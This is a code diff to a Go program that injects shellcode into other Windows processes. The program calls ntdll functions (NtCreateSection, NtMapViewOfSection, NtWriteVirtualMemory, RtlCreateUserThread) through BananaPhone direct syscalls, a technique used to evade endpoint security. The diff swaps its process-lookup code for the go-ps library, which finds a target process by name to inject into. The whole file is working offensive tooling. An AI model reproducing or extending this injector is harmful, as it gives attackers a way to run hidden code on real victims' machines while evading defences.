@@ -2,11 +2,12 @@ package main
 
 import (
 	"fmt"
-	"github.com/TheTitanrain/w32"
 	"os"
+	"strings"
 	"time"
 	"unsafe"
 
+	ps "github.com/mitchellh/go-ps"
 	hl "gitlab.com/mjwhitta/hilighter"
 	"golang.org/x/sys/windows"
 	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
@@ -122,7 +123,7 @@ func NtMapViewOfSection(
 // NtOpenProcess from ntdll.
 func NtOpenProcess(
 	ntopen uint16,
-	pid uint32,
+	pid int,
 	access uintptr,
 ) (pHndl windows.Handle, e error) {
 	_, err := bananaphone.Syscall(
@@ -207,7 +208,7 @@ func RtlCreateUserThread(
 // WithNtCreateSection will launch the provided shellcode using
 // NtCreateSection, NtMapViewOfSection, NtWriteVirtualMemory,
 // NtMapViewOfSection (again) and RtlCreateUserThread.
-func WithNtCreateSection(pid uint32, sc []byte, ntsection,ntmap,ntopen,ntwrite uint16) error {
+func WithNtCreateSection(pid int, sc []byte, ntsection,ntmap,ntopen,ntwrite uint16) error {
 	var addr uintptr
 	var e error
 	var pHndl windows.Handle
@@ -278,37 +279,30 @@ func WithNtCreateSection(pid uint32, sc []byte, ntsection,ntmap,ntopen,ntwrite u
 	return e
 }
 
-func getprocname(id uint32) string {
-	snapshot := w32.CreateToolhelp32Snapshot(w32.TH32CS_SNAPMODULE, id)
-	var me w32.MODULEENTRY32
-	me.Size = uint32(unsafe.Sizeof(me))
-	if w32.Module32First(snapshot, &me) {
-		return w32.UTF16PtrToString(&me.SzModule[0])
-	}
-	return ""
-}
-
-func getpid(pname []string) uint32 {
-	// enter target processes here, the more the better..
-	//target_procs := []string{"notepad.exe", "OneDrive.exe", "explorer.exe"}
+func getpid(pname []string) int {
 	target_procs := pname[1:]
-	sz := uint32(1000)
-	procs := make([]uint32, sz)
-	var bytesReturned uint32
+	processList, err := ps.Processes()
+	if err != nil {
+		fmt.Println("ps.Processes() Failed, are you using windows?")
+		return 0
+	}
+	// map ages
 	for _,proc := range target_procs {
-		if w32.EnumProcesses(procs, sz, &bytesReturned) {
-			for _, pid := range procs[:int(bytesReturned)/4] {
-				if getprocname(pid) == proc {
-					return pid
-				} else {
-					// sleep to limit cpu usage
-					time.Sleep(5 * time.Millisecond)
-				}
+		for x := range processList {
+			var process ps.Process
+			process = processList[x]
+			if strings.Contains(process.Executable(),proc){
+				return process.Pid()
+			}else {
+				// sleep to limit cpu usage
+				time.Sleep(5 * time.Millisecond)
 			}
+
 		}
 	}
 	return 0
 }
+
 
 
 func main(){
